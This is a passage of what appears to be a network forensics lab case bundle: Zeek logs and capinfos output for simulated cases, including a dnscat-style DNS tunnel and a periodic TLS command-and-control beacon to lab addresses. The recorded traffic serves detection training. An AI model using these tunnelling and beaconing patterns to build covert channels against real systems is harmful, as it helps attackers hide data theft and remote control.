1793712101.326056	FXFDlh49H6I2dBkXYd	CY729Y2IRo89aYI1	192.168.56.10	52112	192.168.56.30	80	HTTP	0	EXTRACT,SHA256,SHA1,MD5	text/html	-	0.001200	T	F	4345	4345	0	0	F	-	3f0f4a321399cf1de082f595f9e1d150	56dd0a9fade6024ba876d521e1d4d35e52b142f7	d618d7a8bcd95e4f6aed2dcbfc8ca6aa05e4590a158712cc314c0d835f6b5dfb	extract-1793712101.326056-HTTP-FXFDlh49H6I2dBkXYd	F	-
1793712102.071753	FDAy1P2bz2gXESlpec	CY729Y2IRo89aYI1	192.168.56.10	52112	192.168.56.30	80	HTTP	0	EXTRACT,SHA256,SHA1,MD5	text/html	-	0.000800	T	F	3978	3978	0	0	F	-	d6da1f0f9be1b5d1ebaf59efa33d5ff5	156ef0c0e6e3b3bf7768360f6d2ea28ab858ccf7	a091ee716b25509f1125b0c7a7f0d5d04c7860a0be6fb1d00ed8b8d10bd90df5	extract-1793712102.071753-HTTP-FDAy1P2bz2gXESlpec	F	-
1793712132.879703	FkBLUu28jFlfXZkM2d	CnB1el1JM6p40XxRT2	192.168.56.10	52140	192.168.56.30	80	HTTP	0	EXTRACT,SHA256,SHA1,MD5	text/plain	-	0.008001	T	F	28370	28370	0	0	F	-	98e5d93bc6b74b21df42629bb7b03dfe	7ee150370ffa4774e5255b298e293f73e5fb09be	9b44747e8edc117647021d0730dbde052c09374d15c0280308d3cd32763ca4c6	extract-1793712132.879703-HTTP-FkBLUu28jFlfXZkM2d	F	-
#close	2026-11-18-19-06-18
```

### zeek/tsv/files.log — tail -n 12
```
1793712096.089867	FZyo4o2H2tKBY2CVTa	CY729Y2IRo89aYI1	192.168.56.10	52112	192.168.56.30	80	HTTP	0	EXTRACT,SHA256,SHA1,MD5	text/html	-	0.001200	T	F	4159	4159	0	0	F	-	800e491ad5446c74c7379c7182cdb725	71b1764ed5f98aebe6ed2c173b2c5ccc35737f92	0e446b8a766e59cb1bbf3bdc3c03cbf3301b93460e9988d3083ebaab7c8bef87	extract-1793712096.089867-HTTP-FZyo4o2H2tKBY2CVTa	F	-
1793712096.659466	FmLLfVjmbIsqxuQmb	CY729Y2IRo89aYI1	192.168.56.10	52112	192.168.56.30	80	HTTP	0	EXTRACT,SHA256,SHA1,MD5	text/html	-	0.000800	T	F	3978	3978	0	0	F	-	d6da1f0f9be1b5d1ebaf59efa33d5ff5	156ef0c0e6e3b3bf7768360f6d2ea28ab858ccf7	a091ee716b25509f1125b0c7a7f0d5d04c7860a0be6fb1d00ed8b8d10bd90df5	extract-1793712096.659466-HTTP-FmLLfVjmbIsqxuQmb	F	-
1793712097.383686	FHAgwF4vSfrWpw5Flb	CY729Y2IRo89aYI1	192.168.56.10	52112	192.168.56.30	80	HTTP	0	EXTRACT,SHA256,SHA1,MD5	text/html	-	0.000800	T	F	3978	3978	0	0	F	-	d6da1f0f9be1b5d1ebaf59efa33d5ff5	156ef0c0e6e3b3bf7768360f6d2ea28ab858ccf7	a091ee716b25509f1125b0c7a7f0d5d04c7860a0be6fb1d00ed8b8d10bd90df5	extract-1793712097.383686-HTTP-FHAgwF4vSfrWpw5Flb	F	-
1793712098.245145	FCUgIA1jOKbgyMIkp4	CY729Y2IRo89aYI1	192.168.56.10	52112	192.168.56.30	80	HTTP	0	EXTRACT,SHA256,SHA1,MD5	text/html	-	0.000800	T	F	3979	3979	0	0	F	-	3ae9d476e5db185635329af27f337e41	34b44852a280ce5a94fbfef8a9d7c6ea0e290a59	02b1f9d7940e418eee59ceb9c8194a4c474954f5a8f71e2f69c23ba80c4d9574	extract-1793712098.245145-HTTP-FCUgIA1jOKbgyMIkp4	F	-
1793712098.730560	Fqze8CUxjpsGuOSba	CY729Y2IRo89aYI1	192.168.56.10	52112	192.168.56.30	80	HTTP	0	EXTRACT,SHA256,SHA1,MD5	text/html	-	0.001201	T	F	4016	4016	0	0	F	-	d6cdb2bdd694f8171b02c5e95d76a3f8	8e59fe74e025d979b1fe1d1c0627211707e1f71b	cea510f780d2dcc887ea4d95dc418972e7ffc1f93cea1d4ff90a6c93764ab04c	extract-1793712098.73056-HTTP-Fqze8CUxjpsGuOSba	F	-
1793712099.346700	FLhtXu34odFEvD2oB6	CY729Y2IRo89aYI1	192.168.56.10	52112	192.168.56.30	80	HTTP	0	EXTRACT,SHA256,SHA1,MD5	text/html	-	0.001200	T	F	4031	4031	0	0	F	-	9ed6006de6bac31705fcf6a9f4d8161a	628d0ad4f7fb6982613fc4fe8d09b6038bd386ba	6c944a25d503c0c1ebe0ae96426b721e1fd0e87290a93967d6067e61e8de4df7	extract-1793712099.3467-HTTP-FLhtXu34odFEvD2oB6	F	-
1793712100.203811	FtLdJN1GoJmVSvcsNa	CY729Y2IRo89aYI1	192.168.56.10	52112	192.168.56.30	80	HTTP	0	EXTRACT,SHA256,SHA1,MD5	text/html	-	0.001201	T	F	4121	4121	0	0	F	-	1db05c65e6a3916cf96f29640ae21ce5	9506d84b197eacf094fa7a9987479edf293d5fca	bb871f3af9fbde982c4d4cbe9550254aa4c13d18647b890c7a5cc754c3b882d0	extract-1793712100.203811-HTTP-FtLdJN1GoJmVSvcsNa	F	-
1793712100.616066	F0mkvx4bYDZdfTdooe	CY729Y2IRo89aYI1	192.168.56.10	52112	192.168.56.30	80	HTTP	0	EXTRACT,SHA256,SHA1,MD5	text/html	-	0.001200	T	F	4241	4241	0	0	F	-	7e671c16c2340f970979a9668a655e38	1f279e3982a56dfc2989b7a4bf0b014f2122fb5f	4d54cf64ea2cb888e995481d7091d6b4c31d4f64777c2437462920930a00d010	extract-1793712100.616066-HTTP-F0mkvx4bYDZdfTdooe	F	-
1793712101.326056	FXFDlh49H6I2dBkXYd	CY729Y2IRo89aYI1	192.168.56.10	52112	192.168.56.30	80	HTTP	0	EXTRACT,SHA256,SHA1,MD5	text/html	-	0.001200	T	F	4345	4345	0	0	F	-	3f0f4a321399cf1de082f595f9e1d150	56dd0a9fade6024ba876d521e1d4d35e52b142f7	d618d7a8bcd95e4f6aed2dcbfc8ca6aa05e4590a158712cc314c0d835f6b5dfb	extract-1793712101.326056-HTTP-FXFDlh49H6I2dBkXYd	F	-
1793712102.071753	FDAy1P2bz2gXESlpec	CY729Y2IRo89aYI1	192.168.56.10	52112	192.168.56.30	80	HTTP	0	EXTRACT,SHA256,SHA1,MD5	text/html	-	0.000800	T	F	3978	3978	0	0	F	-	d6da1f0f9be1b5d1ebaf59efa33d5ff5	156ef0c0e6e3b3bf7768360f6d2ea28ab858ccf7	a091ee716b25509f1125b0c7a7f0d5d04c7860a0be6fb1d00ed8b8d10bd90df5	extract-1793712102.071753-HTTP-FDAy1P2bz2gXESlpec	F	-
1793712132.879703	FkBLUu28jFlfXZkM2d	CnB1el1JM6p40XxRT2	192.168.56.10	52140	192.168.56.30	80	HTTP	0	EXTRACT,SHA256,SHA1,MD5	text/plain	-	0.008001	T	F	28370	28370	0	0	F	-	98e5d93bc6b74b21df42629bb7b03dfe	7ee150370ffa4774e5255b298e293f73e5fb09be	9b44747e8edc117647021d0730dbde052c09374d15c0280308d3cd32763ca4c6	extract-1793712132.879703-HTTP-FkBLUu28jFlfXZkM2d	F	-
#close	2026-11-18-19-06-18
```


## case03_dns_tunnel

### capinfos
```
File name:           raw/case03.pcap
File type:           Wireshark/tcpdump/... - pcap
File encapsulation:  Ethernet
File timestamp precision:  microseconds (6)
Packet size limit:   file hdr: 262144 bytes
Number of packets:   890
File size:           131 kB
Data size:           116 kB
Capture duration:    298.506573 seconds
Earliest packet time: 2026-11-18 18:25:25.008145
Latest packet time:   2026-11-18 18:30:23.514718
Data byte rate:      391 bytes/s
Data bit rate:       3,129 bits/s
Average packet size: 131.20 bytes
Average packet rate: 2 packets/s
SHA256:              e06cac58e6204357992523b8b75f8c22503c7a82e313f00697c2bf74f7ed44eb
SHA1:                3b672992c68e1abde5f00b445b22841450398e26
Strict time order:   True
Number of interfaces in file: 1
Interface #0 info:
                     Encapsulation = Ethernet (1 - ether)
                     Capture length = 262144
                     Time precision = microseconds (6)
                     Time ticks per second = 1000000
                     Number of stat entries = 0
                     Number of packets = 890
```

### zeek/tsv/conn.log — head -n 28
```
#separator \x09
#set_separator	,
#empty_field	(empty)
#unset_field	-
#path	conn
#open	2026-11-18-19-29-55
#fields	ts	uid	id.orig_h	id.orig_p	id.resp_h	id.resp_p	proto	service	duration	orig_bytes	resp_bytes	conn_state	local_orig	local_resp	missed_bytes	history	orig_pkts	orig_ip_bytes	resp_pkts	resp_ip_bytes	tunnel_parents	ip_proto
#types	time	string	addr	port	addr	port	enum	string	interval	count	count	string	bool	bool	count	string	count	count	count	count	set[string]	count
1795026325.008145	Chubce1wik6p4KDZeg	127.0.0.1	44651	127.0.0.1	53	udp	dns	298.506573	27322	52063	SF	T	T	0	Dd	445	39782	445	64523	-	17
#close	2026-11-18-19-29-55
```

### zeek/tsv/conn.log — tail -n 12
```
#separator \x09
#set_separator	,
#empty_field	(empty)
#unset_field	-
#path	conn
#open	2026-11-18-19-29-55
#fields	ts	uid	id.orig_h	id.orig_p	id.resp_h	id.resp_p	proto	service	duration	orig_bytes	resp_bytes	conn_state	local_orig	local_resp	missed_bytes	history	orig_pkts	orig_ip_bytes	resp_pkts	resp_ip_bytes	tunnel_parents	ip_proto
#types	time	string	addr	port	addr	port	enum	string	interval	count	count	string	bool	bool	count	string	count	count	count	count	set[string]	count
1795026325.008145	Chubce1wik6p4KDZeg	127.0.0.1	44651	127.0.0.1	53	udp	dns	298.506573	27322	52063	SF	T	T	0	Dd	445	39782	445	64523	-	17
#close	2026-11-18-19-29-55
```

### zeek/tsv/dns.log — head -n 28
```
#separator \x09
#set_separator	,
#empty_field	(empty)
#unset_field	-
#path	dns
#open	2026-11-18-19-29-55
#fields	ts	uid	id.orig_h	id.orig_p	id.resp_h	id.resp_p	proto	trans_id	rtt	query	qclass	qclass_name	qtype	qtype_name	rcode	rcode_name	AA	TC	RD	RA	Z	answers	TTLs	rejected	opcode	opcode_name
#types	time	string	addr	port	addr	port	enum	count	interval	string	count	string	count	string	count	string	bool	bool	bool	bool	count	vector[string]	vector[interval]	bool	count	string
1795026325.008145	Chubce1wik6p4KDZeg	127.0.0.1	44651	127.0.0.1	53	udp	10709	0.136774	dnscat.87ff03bb73000000005fa2769a17431349604b950c74cf27751cb25e3987.b86d38264bde3c1cbcc94e8bec2d0c05e62443f7938905b7d04b44952a50.9f741f9cf17edcdde4b0ac85f7	1	C_INTERNET	16	TXT	0	NOERROR	F	F	T	T	0	TXT 146 643503bb73000000009ab4872238e727902135d28768324af56c18d822e876bfe8826d95ad128568f936b4bda7c1a0e8fd15ba612cb46ed98e8d0754cf014c39221c70d285cbbe5383	60.000000	F	0	query
1795026326.052546	Chubce1wik6p4KDZeg	127.0.0.1	44651	127.0.0.1	53	udp	27805	0.001292	dnscat.bfaa03bb731bd0a9b82c790000532222e2e9256897372d52dcb1e2c7e01c.dd5b47730bea27887f25b55d5e135ccf423fab	1	C_INTERNET	15	MX	0	NOERROR	F	F	T	T	0	dnscat.7e6f03bb731fbb001da6feffffea3b73fbbe5b16964d49fdc219df7b215a571.a8f967a284be085fdf1b0208f34a77680b4	60.000000	F	0	query
1795026327.059438	Chubce1wik6p4KDZeg	127.0.0.1	44651	127.0.0.1	53	udp	12245	0.001439	dnscat.947700bb73e8808cf1bcfc000159fc043e6c6d63c156c106ac2d0078337c.fd7d	1	C_INTERNET	16	TXT	0	NOERROR	F	F	T	T	0	TXT 34 f8c700bb73e301ce353441ffff38be73fb	60.000000	F	0	query
1795026327.061236	Chubce1wik6p4KDZeg	127.0.0.1	44651	127.0.0.1	53	udp	13952	0.000640	dnscat.a28e01bb739da4787723b60002c83ab9fa	1	C_INTERNET	16	TXT	0	NOERROR	F	F	T	T	0	TXT 34 5efb01bb73bfa202d55835ffff38beb4f4	60.000000	F	0	query
1795026328.067388	Chubce1wik6p4KDZeg	127.0.0.1	44651	127.0.0.1	53	udp	30650	0.001016	dnscat.1db401bb734184745b98d7000317cbe4c6	1	C_INTERNET	16	TXT	0	NOERROR	F	F	T	T	0	TXT 34 d63101bb73fc2a20eb4e81ffff38beb4f4	60.000000	F	0	query
1795026329.072511	Chubce1wik6p4KDZeg	127.0.0.1	44651	127.0.0.1	53	udp	34549	0.000893	dnscat.c4cd01bb7335bb9d2220aa00040946a0e9	1	C_INTERNET	16	TXT	0	NOERROR	F	F	T	T	0	TXT 34 4a6001bb73921df98a140dffff38beb4f4	60.000000	F	0	query
1795026330.078638	Chubce1wik6p4KDZeg	127.0.0.1	44651	127.0.0.1	53	udp	31981	0.001036	dnscat.885e01bb73d0db2dfd7c930005d6335631	1	C_INTERNET	16	TXT	0	NOERROR	F	F	T	T	0	TXT 34 c62601bb733e2ceb3b5062ffff38beb4f4	60.000000	F	0	query
1795026331.084682	Chubce1wik6p4KDZeg	127.0.0.1	44651	127.0.0.1	53	udp	55449	0.000956	dnscat.5b7b01bb733ee1dbcc2eb0000684bbf95f	1	C_INTERNET	15	MX	0	NOERROR	F	F	T	T	0	dnscat.a58801bb73ae34993ed528ffff38beb4f4	60.000000	F	0	query
1795026332.093041	Chubce1wik6p4KDZeg	127.0.0.1	44651	127.0.0.1	53	udp	30388	0.001903	dnscat.ebdb01bb739fd297079e4c0007bd8d99a3	1	C_INTERNET	16	TXT	0	NOERROR	F	F	T	T	0	TXT 34 388501bb73e6c397dc914bffff38beb4f4	60.000000	F	0	query
1795026333.099915	Chubce1wik6p4KDZeg	127.0.0.1	44651	127.0.0.1	53	udp	5591	0.000905	dnscat.4e5c01bb73ba96ede1378400082364fed6	1	C_INTERNET	5	CNAME	0	NOERROR	F	F	T	T	0	dnscat.dbe801bb73cf8573fb010bffff38beb4f4	60.000000	F	0	query
1795026334.106539	Chubce1wik6p4KDZeg	127.0.0.1	44651	127.0.0.1	53	udp	16300	0.001217	dnscat.d65b01bb73cc5fb9e330160009e69ab08c	1	C_INTERNET	15	MX	0	NOERROR	F	F	T	T	0	dnscat.5d4c01bb7386517f2b5c44ffff38beb4f4	60.000000	F	0	query
1795026335.113463	Chubce1wik6p4KDZeg	127.0.0.1	44651	127.0.0.1	53	udp	44105	0.001358	dnscat.160701bb73d0d7c89d07c7000a06f6fc3f	1	C_INTERNET	15	MX	0	NOERROR	F	F	T	T	0	dnscat.39f501bb730b60505f3698ffff38beb4f4	60.000000	F	0	query
1795026336.119158	Chubce1wik6p4KDZeg	127.0.0.1	44651	127.0.0.1	53	udp	56350	0.001005	dnscat.2a7e01bb73fced32c98294000b0cde1426	1	C_INTERNET	16	TXT	0	NOERROR	F	F	T	T	0	TXT 34 064b01bb7371dd1541c65effff38beb4f4	60.000000	F	0	query
1795026337.124423	Chubce1wik6p4KDZeg	127.0.0.1	44651	127.0.0.1	53	udp	22963	0.000880	dnscat.742601bb7361e557ab8148000c1326f478	1	C_INTERNET	16	TXT	0	NOERROR	F	F	T	T	0	TXT 34 607c01bb73b8ea36580ef1ffff38beb4f4	60.000000	F	0	query
1795026338.128314	Chubce1wik6p4KDZeg	127.0.0.1	44651	127.0.0.1	53	udp	11994	0.000668	dnscat.7fa001bb731844e044a97b000d89c200ae	1	C_INTERNET	5	CNAME	0	NOERROR	F	F	T	T	0	dnscat.40e401bb733436eff46b45ffff38beb4f4	60.000000	F	0	query
1795026339.132730	Chubce1wik6p4KDZeg	127.0.0.1	44651	127.0.0.1	53	udp	46741	0.000733	dnscat.86fb01bb73180a20f2afe8000e67ff13cf	1	C_INTERNET	5	CNAME	0	NOERROR	F	F	T	T	0	dnscat.b3dc01bb73cdc61d1933a3ffff38beb4f4	60.000000	F	0	query
1795026340.137810	Chubce1wik6p4KDZeg	127.0.0.1	44651	127.0.0.1	53	udp	50093	0.000760	dnscat.3f3d01bb73ad564ce526fb000f9f10d044	1	C_INTERNET	5	CNAME	0	NOERROR	F	F	T	T	0	dnscat.49df01bb7347e0277c041effff38beb4f4	60.000000	F	0	query
1795026341.144057	Chubce1wik6p4KDZeg	127.0.0.1	44651	127.0.0.1	53	udp	46956	0.001074	dnscat.34f501bb736d9812c2ee3f0010e7e977f8	1	C_INTERNET	15	MX	0	NOERROR	F	F	T	T	0	dnscat.89a701bb73338d7aadb467ffff38beb4f4	60.000000	F	0	query
1795026342.150065	Chubce1wik6p4KDZeg	127.0.0.1	44651	127.0.0.1	53	udp	40643	0.001689	dnscat.7df301bb7355807cd66ad900112eaf626f	1	C_INTERNET	15	MX	0	NOERROR	F	F	T	T	0	dnscat.cbdc01bb73c5fb07f858caffff38beb4f4	60.000000	F	0	query
1795026343.157113	Chubce1wik6p4KDZeg	127.0.0.1	44651	127.0.0.1	53	udp	40877	0.000942	dnscat.52e301bb7322360147c8470012d8d614a3	1	C_INTERNET	5	CNAME	0	NOERROR	F	F	T	T	0	dnscat.6d5c01bb7371917db49c3bffff38beb4f4	60.000000	F	0	query
```

### zeek/tsv/dns.log — tail -n 12
```
1795026613.453899	Chubce1wik6p4KDZeg	127.0.0.1	44651	127.0.0.1	53	udp	54496	0.001532	dnscat.f3c0019658b0d7e5d33e1c00aa6ba3e403	1	C_INTERNET	5	CNAME	0	NOERROR	F	F	T	T	0	dnscat.0b9f0196589dc6b30f8affffffd079be6c	60.000000	F	0	query
1795026614.459738	Chubce1wik6p4KDZeg	127.0.0.1	44651	127.0.0.1	53	udp	50538	0.001044	dnscat.34680196589901467f175300abfc8555c5	1	C_INTERNET	5	CNAME	0	NOERROR	F	F	T	T	0	dnscat.3421019658f4f869af26e3ffffd079be6c	60.000000	F	0	query
1795026615.465966	Chubce1wik6p4KDZeg	127.0.0.1	44651	127.0.0.1	53	udp	31848	0.000787	dnscat.b05d019658c4893b039e2400acd2ea7fbc	1	C_INTERNET	16	TXT	0	NOERROR	F	F	T	T	0	TXT 34 3fc7019658f138d080832cffffd079be6c	60.000000	F	0	query
1795026616.472368	Chubce1wik6p4KDZeg	127.0.0.1	44651	127.0.0.1	53	udp	11393	0.000952	dnscat.1d5401965822bfe40a21c800ad86c62492	1	C_INTERNET	16	TXT	0	NOERROR	F	F	T	T	0	TXT 34 fd9d01965803614da4dbfbffffd079be6c	60.000000	F	0	query
1795026617.478031	Chubce1wik6p4KDZeg	127.0.0.1	44651	127.0.0.1	53	udp	34703	0.000579	dnscat.bcd0019658ea3de35286a200ae4fa90907	1	C_INTERNET	15	MX	0	NOERROR	F	F	T	T	0	dnscat.f5430196581e031fca5a06ffffd079be6c	60.000000	F	0	query
1795026618.483113	Chubce1wik6p4KDZeg	127.0.0.1	44651	127.0.0.1	53	udp	2370	0.000856	dnscat.7c84019658ef809ae4de9300aff08244f3	1	C_INTERNET	15	MX	0	NOERROR	F	F	T	T	0	dnscat.e7cc019658c5e6f5aa7f64ffffd079be6c	60.000000	F	0	query
1795026619.487769	Chubce1wik6p4KDZeg	127.0.0.1	44651	127.0.0.1	53	udp	15682	0.001128	dnscat.7b160196582bb754c9ee5c00b060e613ce	1	C_INTERNET	16	TXT	0	NOERROR	F	F	T	T	0	TXT 34 15770196587b45e3edf13effffd079be6c	60.000000	F	0	query
1795026620.492977	Chubce1wik6p4KDZeg	127.0.0.1	44651	127.0.0.1	53	udp	54983	0.001272	dnscat.2397019658263a0924160600b1b805bd21	1	C_INTERNET	5	CNAME	0	NOERROR	F	F	T	T	0	dnscat.d608019658f2497eed2bc5ffffd079be6c	60.000000	F	0	query
1795026621.500071	Chubce1wik6p4KDZeg	127.0.0.1	44651	127.0.0.1	53	udp	22791	0.001467	dnscat.b3060196585cebf0e9b1c600b2093189d0	1	C_INTERNET	16	TXT	0	NOERROR	F	F	T	T	0	TXT 34 3a480196586b4051ec2877ffffd079be6c	60.000000	F	0	query
1795026622.507997	Chubce1wik6p4KDZeg	127.0.0.1	44651	127.0.0.1	53	udp	16670	0.000716	dnscat.fb59019658b05e957197d700b3dc93067d	1	C_INTERNET	5	CNAME	0	NOERROR	F	F	T	T	0	dnscat.edac0196581678c0c14b96ffffd079be6c	60.000000	F	0	query
1795026623.513247	Chubce1wik6p4KDZeg	127.0.0.1	44651	127.0.0.1	53	udp	51425	0.001471	dnscat.dbb30196584ef82b8ed59a00b452340488	1	C_INTERNET	15	MX	0	NOERROR	F	F	T	T	0	dnscat.efda0196583effdc04f6deffffd079be6c	60.000000	F	0	query
#close	2026-11-18-19-29-55
```


## case04_c2_beacon

### capinfos
```
File name:           cases/case04_c2_beacon/raw/case04.pcap
File type:           Wireshark/tcpdump/... - pcap
File encapsulation:  Ethernet
File timestamp precision:  microseconds (6)
Packet size limit:   file hdr: 65535 bytes
Number of packets:   2,032
File size:           910 kB
Data size:           877 kB
Capture duration:    2593.178417 seconds
Earliest packet time: 2026-11-04 14:00:00.000000
Latest packet time:   2026-11-04 14:43:13.178417
Data byte rate:      338 bytes/s
Data bit rate:       2,708 bits/s
Average packet size: 432.01 bytes
Average packet rate: 0 packets/s
SHA256:              eb59e98b1fcf78c39cdc39ffc96d3c81dfffcc96d899f3206152e04ddf7cd675
SHA1:                a173c9f33a93233a35e7bd358858a68fcb10eca0
Strict time order:   True
Number of interfaces in file: 1
Interface #0 info:
                     Encapsulation = Ethernet (1 - ether)
                     Capture length = 65535
                     Time precision = microseconds (6)
                     Time ticks per second = 1000000
                     Number of stat entries = 0
                     Number of packets = 2032
```

### zeek/tsv/conn.log — head -n 28
```
#separator \x09
#set_separator	,
#empty_field	(empty)
#unset_field	-
#path	conn
#open	2026-11-18-19-06-19
#fields	ts	uid	id.orig_h	id.orig_p	id.resp_h	id.resp_p	proto	service	duration	orig_bytes	resp_bytes	conn_state	local_orig	local_resp	missed_bytes	history	orig_pkts	orig_ip_bytes	resp_pkts	resp_ip_bytes	tunnel_parents	ip_proto
#types	time	string	addr	port	addr	port	enum	string	interval	count	count	string	bool	bool	count	string	count	count	count	count	set[string]	count
1793800800.000000	CYP6bU5pjOBgnKBM5	192.168.56.40	49501	203.0.113.50	8443	tcp	ssl	0.411740	578	227	SF	T	T	0	ShADadFf	10	978	9	587	-	6
1793800860.012941	CIglQ68HERgtLGJKh	192.168.56.40	50104	198.51.100.20	443	tcp	ssl	1.113448	797	74653	SF	T	T	0	ShADadFf	65	3397	64	77213	-	6
1793800870.315633	Clu39NL8xphBDuIxk	192.168.56.40	49502	203.0.113.50	8443	tcp	ssl	0.411740	594	227	SF	T	T	0	ShADadFf	10	994	9	587	-	6
1793800925.243846	CCnTQKOmAL9KgZlta	192.168.56.40	49503	203.0.113.50	8443	tcp	ssl	0.411740	578	227	SF	T	T	0	ShADadFf	10	978	9	587	-	6
1793800980.726227	Ckh7p94dWbBkubUj47	192.168.56.40	49504	203.0.113.50	8443	tcp	ssl	0.411740	578	227	SF	T	T	0	ShADadFf	10	978	9	587	-	6
1793801043.569380	CVVDZs3hq0NYY2iN6b	192.168.56.40	49505	203.0.113.50	8443	tcp	ssl	0.411740	578	227	SF	T	T	0	ShADadFf	10	978	9	587	-	6
1793801097.507661	CAz8vd4faDVkALHlUb	192.168.56.40	49506	203.0.113.50	8443	tcp	ssl	0.411740	578	227	SF	T	T	0	ShADadFf	10	978	9	587	-	6
1793801154.152915	CFtURd4sol8pHDgLrj	192.168.56.40	49507	203.0.113.50	8443	tcp	ssl	0.411741	578	227	SF	T	T	0	ShADadFf	10	978	9	587	-	6
1793801219.317180	C9SOdThDTpYZX761k	192.168.56.40	49508	203.0.113.50	8443	tcp	ssl	0.587141	578	4219	SF	T	T	0	ShADadFf	12	1058	11	4659	-	6
1793801225.317180	Ccw67I2GayvxOjVUT6	192.168.56.40	49509	203.0.113.50	8443	tcp	ssl	0.704441	2302	203	SF	T	T	0	ShADadFf	11	2742	10	603	-	6
1793801285.486795	CzQNrT2RizULTj4Txk	192.168.56.40	49510	203.0.113.50	8443	tcp	ssl	0.411740	594	227	SF	T	T	0	ShADadFf	10	994	9	587	-	6
1793801307.849883	CqwXHJ2G35ZTXeMWw9	192.168.56.40	50101	198.51.100.20	443	tcp	ssl	1.143848	981	77015	SF	T	T	0	ShADadFf	67	3661	66	79655	-	6
1793801345.252638	CJGE614daWVPKlIwFl	192.168.56.40	49511	203.0.113.50	8443	tcp	ssl	0.411740	594	227	SF	T	T	0	ShADadFf	10	994	9	587	-	6
1793801414.896960	CIqMz41Ye7qk8xZMZ	192.168.56.40	49512	203.0.113.50	8443	tcp	ssl	0.411740	594	227	SF	T	T	0	ShADadFf	10	994	9	587	-	6
1793801470.658688	Cm0JwF3CHbmm1snavh	192.168.56.40	49513	203.0.113.50	8443	tcp	ssl	0.411740	594	227	SF	T	T	0	ShADadFf	10	994	9	587	-	6
1793801539.413418	CkIjuG1FI1ddsNTfV4	192.168.56.40	49514	203.0.113.50	8443	tcp	ssl	0.411741	594	227	SF	T	T	0	ShADadFf	10	994	9	587	-	6
1793801590.857705	C4FkZotR3FH1wLRkk	192.168.56.40	49515	203.0.113.50	8443	tcp	ssl	0.411740	578	227	SF	T	T	0	ShADadFf	10	978	9	587	-	6
1793801657.335064	CPZOLl3MC5KITnlS2a	192.168.56.40	49516	203.0.113.50	8443	tcp	ssl	0.411740	594	227	SF	T	T	0	ShADadFf	10	994	9	587	-	6
1793801713.567708	CdlV2M2bVPRWwdBVo5	192.168.56.40	49517	203.0.113.50	8443	tcp	ssl	0.411740	578	227	SF	T	T	0	ShADadFf	10	978	9	587	-	6
1793801767.817545	CWaLw5yDJdSJ0Jeh	192.168.56.40	49518	203.0.113.50	8443	tcp	ssl	0.411741	578	227	SF	T	T	0	ShADadFf	10	978	9	587	-	6
```

### zeek/tsv/conn.log — tail -n 12
```
1793802905.067088	ChCcZ62o3euOdQSFP1	192.168.56.40	50106	198.51.100.20	443	tcp	ssl	1.966155	789	149555	SF	T	T	0	ShADadFf	121	5629	120	154355	-	6
1793802931.129723	CqeaUv18BPzebAKIsg	192.168.56.40	49538	203.0.113.51	8443	tcp	ssl	0.411741	594	227	SF	T	T	0	ShADadFf	10	994	9	587	-	6
1793802980.149503	CpsewY3sggTxx4DdRj	192.168.56.40	49539	203.0.113.51	8443	tcp	ssl	0.411740	594	227	SF	T	T	0	ShADadFf	10	994	9	587	-	6
1793803037.284211	C8lWbP3uINhrCnQdu4	192.168.56.40	49540	203.0.113.51	8443	tcp	ssl	0.411740	594	227	SF	T	T	0	ShADadFf	10	994	9	587	-	6
1793803097.897862	C1Lmzv2vPU5QIllSx1	192.168.56.40	49541	203.0.113.51	8443	tcp	ssl	0.411741	578	227	SF	T	T	0	ShADadFf	10	978	9	587	-	6
1793803148.929071	CiRNUk2IGQGem8RlT	192.168.56.40	49542	203.0.113.51	8443	tcp	ssl	0.411740	578	227	SF	T	T	0	ShADadFf	10	978	9	587	-	6
1793803208.430373	Cc6ioQ3rHZJ4tdSbl2	192.168.56.40	49543	203.0.113.51	8443	tcp	ssl	0.411740	578	227	SF	T	T	0	ShADadFf	10	978	9	587	-	6
1793803265.993287	C4Ld423NXUMNhJdwkj	192.168.56.40	49544	203.0.113.51	8443	tcp	ssl	0.411740	578	227	SF	T	T	0	ShADadFf	10	978	9	587	-	6
1793803335.365305	CbJCEIYJVlLKsOnKf	192.168.56.40	49545	203.0.113.51	8443	tcp	ssl	0.411740	594	227	SF	T	T	0	ShADadFf	10	994	9	587	-	6
1793803391.364763	CPay62pf2nPXZhLKc	192.168.56.40	50105	198.51.100.20	443	tcp	ssl	1.798654	872	135087	SF	T	T	0	ShADadFf	110	5272	109	139447	-	6
1793803390.951097	Cx1lVT33ISfDIgcjpk	192.168.56.40	49546	203.0.113.51	8443	tcp	ssl	0.411740	594	227	SF	T	T	0	ShADadFf	10	994	9	587	-	6
#close	2026-11-18-19-06-19
```

### zeek/tsv/ssl.log — head -n 28
```
#separator \x09
#set_separator	,
#empty_field	(empty)
#unset_field	-
#path	ssl
#open	2026-11-18-19-06-19
#fields	ts	uid	id.orig_h	id.orig_p	id.resp_h	id.resp_p	version	cipher	curve	server_name	resumed	last_alert	next_protocol	established	ssl_history	cert_chain_fps	client_cert_chain_fps	sni_matches_cert	validation_status
#types	time	string	addr	port	addr	port	string	string	string	string	bool	string	string	bool	string	vector[string]	vector[string]	bool	string
1793800800.047040	CYP6bU5pjOBgnKBM5	192.168.56.40	49501	203.0.113.50	8443	TLSv12	TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256	-	updates.cdn-lab.test	F	-	-	T	CsnGIi	-	-	-	-
1793800860.044981	CIglQ68HERgtLGJKh	192.168.56.40	50104	198.51.100.20	443	TLSv12	TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256	-	www.example.test	F	-	-	T	CsnGIi	-	-	-	-
1793800870.362673	Clu39NL8xphBDuIxk	192.168.56.40	49502	203.0.113.50	8443	TLSv12	TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256	-	updates.cdn-lab.test	F	-	-	T	CsnGIi	-	-	-	-
1793800925.290886	CCnTQKOmAL9KgZlta	192.168.56.40	49503	203.0.113.50	8443	TLSv12	TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256	-	updates.cdn-lab.test	F	-	-	T	CsnGIi	-	-	-	-
1793800980.773267	Ckh7p94dWbBkubUj47	192.168.56.40	49504	203.0.113.50	8443	TLSv12	TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256	-	updates.cdn-lab.test	F	-	-	T	CsnGIi	-	-	-	-
1793801043.616420	CVVDZs3hq0NYY2iN6b	192.168.56.40	49505	203.0.113.50	8443	TLSv12	TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256	-	updates.cdn-lab.test	F	-	-	T	CsnGIi	-	-	-	-
